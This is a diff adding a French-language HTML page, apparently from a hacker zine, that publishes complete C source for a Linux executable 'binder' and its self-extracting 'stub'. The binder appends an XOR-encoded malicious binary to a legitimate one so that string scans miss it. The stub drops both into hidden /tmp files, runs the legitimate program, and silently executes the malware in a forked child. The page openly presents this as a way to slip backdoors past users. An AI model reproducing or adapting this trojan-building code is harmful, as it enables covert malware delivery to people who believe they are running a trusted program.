@@ -1,0 +1,258 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+	"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <title>LOTFREE9</title>
+  </head>
+  <body>
+    <h1>Binder d'executables pour Linux</h1>
+
+    <p>Le programme qui suit n'est pas inédit. C'est un ancien code privé de la TEAM qui a été publié à l'occasion sur NewFFR quand un des membres a posé des questions sur le sujet.</p>
+    <p>Le code est très basique et simple à comprendre : On a la partie <em>binder</em> qui prend deux exécutables, un officiel et un non-officiel (malware) pour en faire un exécutable final. Cet exécutable final, une fois lancé, extrait les deux programmes et les exécute. L'utilisateur ne s'apperçoit de rien puisqu'il obtient le résultat auquel il s'attendait en lançant l'exécutable.</p>
+
+    <p>En réalité il y a 3 exécutables puisqu'il y a la partie <em>stub</em> du programme qui s'occupe de l'auto-extraction. Cette partie est indépendante des deux programmes et doit donc pouvoir fonctionner quelque soit les deux programmes auquel il sera attaché.</p>
+
+    <p>Pour celà, l'algo est le suivant : le programme binder crée un nouvel exécutable qui est en réalité le programme <em>stub</em> auquel on concatène les deux autres programmes. Le binaire officiel est concaténé tel quel alors que le malware sera lui encodé. De cette façon un <em>strings</em> ou un <em>hexdump</em> sur le programme ne renverra rien de suspect. Après ces deux programmes, on placera les tailles respectives des deux fichiers (sous la forme de deux entiers non signés) puis une signature qui permet de vérifier que le résultat est valide (notez qu'on peut sans problème s'en passer).</p>
+
+    <p>Une fois l'exécutable généré c'est le <em>stub</em> qui se lance, récupère la taille des fichiers à la fin de lui-même et extrait les deux exécutables sous des noms aléatoires pour les exécuter.</p>
+    <p>C'est très basique mais ça permet de cracher vite fait mal fait un exécutable si il on en a besoin (pour peu qu'on ait aussi un malware de côté)</p>
+
+<pre>/* LOTFREE Linux binder
+ * Transform two executables into one auto-extract &amp; launch binary
+ * Evil binary gets executed silently, official binary is launched normally
+ */
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;fcntl.h&gt;
+
+#define STUB &quot;stub&quot;
+#define BUFFSIZE 512
+/* Valeur utilisee pour l'encodage. Doit etre identique dans le stub */
+#define MAGIC 'o'
+
+int main(int argc,char *argv[])
+{
+  int out, in, i, len=0;
+  unsigned int size1, size2 = 0;
+  unsigned char buff[BUFFSIZE], x;
+  struct stat mystat;
+
+  if(argc != 3)
+  {
+    printf(&quot;Usage: %s &lt;Good file&gt; &lt;Bad file&gt;\n&quot;, argv[0]);
+    return 1;
+  }
+  /* Le binaire ELF resultant sera nomme out.exe. A renommer comme bon vous semble */
+  out = open(&quot;out.exe&quot;, O_WRONLY|O_CREAT|O_TRUNC, S_IRUSR|S_IWUSR|S_IXUSR);
+  if(out == -1)
+  {
+    printf(&quot;erreur1\n&quot;);
+    return 1;
+  }
+
+  /* On place d'abord notre &quot;stub&quot; qui se chargera d'extraire le programme officiel
+   * et de l'executer. Le nom du binaire est ici hardcode a &quot;stub&quot;. */
+  in = open(STUB, O_RDONLY);
+  if(in == -1)
+  {
+    printf(&quot;erreur\n&quot;);
+    return 1;
+  }
+  while((len = read(in, buff, BUFFSIZE)) &gt; 0)
+  {
+    write(out, buff, len);
+  }
+  close(in);
+
+  /* On copie le bon fichier a la suite */
+  in = open(argv[1], O_RDONLY);
+  if(in == -1)
+  {
+    printf(&quot;erreur\n&quot;);
+    return 1;
+  }
+  fstat(in,&amp;mystat);
+  size1 = mystat.st_size;
+  printf(&quot;%u\n&quot;, size1);
+  while((len = read(in, buff, BUFFSIZE)) &gt; 0)
+  {
+    write(out,buff,len);
+  }
+  close(in);
+
+  /* Suivi du mechant executable de votre choix (backdoor &amp; co)
+   * Ce binaire est encode (de facon triviale) pour passer inapercu
+   * Ainsi un &quot;strings&quot; sur le fichier final renverra les chaines du bon
+   * binaire mais pas celle de votre evil code :p */
+  in = open(argv[2], O_RDONLY);
+  if(in == -1)
+  {
+    printf(&quot;erreur\n&quot;);
+    return 1;
+  }
+  fstat(in, &amp;mystat);
+  size2 = mystat.st_size;
+  printf(&quot;%u\n&quot;, size2);
+
+  /* get first char */
+  read(in, buff, 1);
+  x = MAGIC;
+  lseek(in, 0, SEEK_SET);
+
+  while((len = read(in, buff, BUFFSIZE)) &gt; 0)
+  {
+    for(i = 0; i &lt; len; i++)
+    {
+      buff[i] ^= x;
+      x = buff[i];
+    }
+    write(out, buff, len);
+  }
+  close(in);
+
+  /* A la fin du fichier on stocke les tailles respectives
+   * du bon et du mauvais programme car le stub en a besoin
+   * pour savoir comment extraire les fichiers */
+  write(out, (int*)&amp;size1, 4);
+  write(out, (int*)&amp;size2, 4);
+
+  /* On place aussi une signature... Une simple verification
+   * qui peut etre rectifiee */
+  write(out, &quot;LOTF&quot;, 4);
+  close(out);
+  return 0;
+}</pre>
+
+<p>--- cut cut cut ---</p>
+
+<pre>/* LOTFREE Linux stub: extract two binaries and execute them */
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;unistd.h&gt;
+
+/* Masque utilise pour les fichiers temporaires */
+#define TPLNAME &quot;/tmp/.lotfXXXXXX&quot;
+/* Cle pour l'encodage, identique a celle du binder */
+#define MAGIC 'o'
+
+int main(int argc, char *argv[], char *envp[])
+{
+  unsigned int sign = 0x46544F4C;
+  unsigned int size1, size2 = 0;
+  unsigned int magic = 0;
+  int fd, out = 0;
+  char *template;
+  unsigned char buffer[64], x ,tmp;
+  pid_t pid;
+
+  fd = open(argv[0], O_RDONLY);
+  if(fd == -1)
+  {
+    return 1;
+  }
+  /* Va a la fin du fichier - 12 octets
+   * Lit les tailles des fichiers + signature */
+  lseek(fd, -12, SEEK_END);
+  read(fd, &amp;size1, 4);
+  read(fd, &amp;size2, 4);
+  read(fd, &amp;magic, 4);
+  if(sign != magic)
+  {
+    close(fd);
+    return 1;
+  }
+
+  /* Si t'avances pendant que je recule, comment veux-tu... */
+  lseek(fd, -12, SEEK_END);
+  lseek(fd, -size2, SEEK_CUR);
+  lseek(fd, -size1, SEEK_CUR);
+
+  template = malloc(strlen(TPLNAME) + 1);
+  /* On cree le &quot;bon&quot; fichier */
+  strcpy(template, TPLNAME);
+  out = mkstemp(template);
+  fchmod(out, S_IRUSR|S_IWUSR|S_IXUSR);
+  while(size1 &gt;= 64)
+  {
+    read(fd, buffer, 64);
+    write(out, buffer, 64);
+    size1 -= 64;
+  }
+  if(size1 &gt; 0)
+  {
+    read(fd, buffer, size1);
+    write(out, buffer, size1);
+  }
+  close(out);
+
+  signal(SIGHUP, SIG_IGN);
+  signal(SIGCHLD, SIG_IGN);
+  /* Viens la que je te fork() */
+  pid = fork();
+  if(pid &gt; 0)
+  {
+    /* On execute le binaire extrait en reproduisant
+     * les arguments et l'environnement tel que ceux
+     * utilises par l'user sur le stub */
+    close(fd);
+    execve(template, argv, envp);
+    return 0;
+  }
+  else if(pid == 0)
+  {
+    /* Accouche d'un petit malware */
+    sleep(1);
+    unlink(template);
+
+    strcpy(template, TPLNAME);
+    out = mkstemp(template);
+    fchmod(out, S_IRUSR|S_IWUSR|S_IXUSR);
+
+    /* Decode, ecrit et execute */
+    x = MAGIC;
+    while(size2 &gt;= 64)
+    {
+      read(fd, buffer, 64);
+      for(magic = 0; magic &lt; 64; magic++)
+      {
+        tmp = buffer[magic];
+        buffer[magic] ^= x;
+        x = tmp;
+      }
+      write(out, buffer, 64);
+      size2 -= 64;
+    }
+    if(size2 &gt; 0)
+    {
+      read(fd, buffer, size2);
+      for(magic = 0; magic &lt; size2; magic++)
+      {
+        tmp = buffer[magic];
+        buffer[magic] ^= x;
+        x = tmp;
+      }
+      write(out, buffer, size2);
+    }
+    close(out);
+    close(fd);
+
+    execl(template, NULL, NULL);
+    /* Aye, c pwne ! */
+    free(template);
+  }
+
+  return 0;
+}</pre>
+<p>Retrouvez le code source dans <a href="../data/binder/">le dossier data/binder</a>.</p>
+  </body>
+</html>
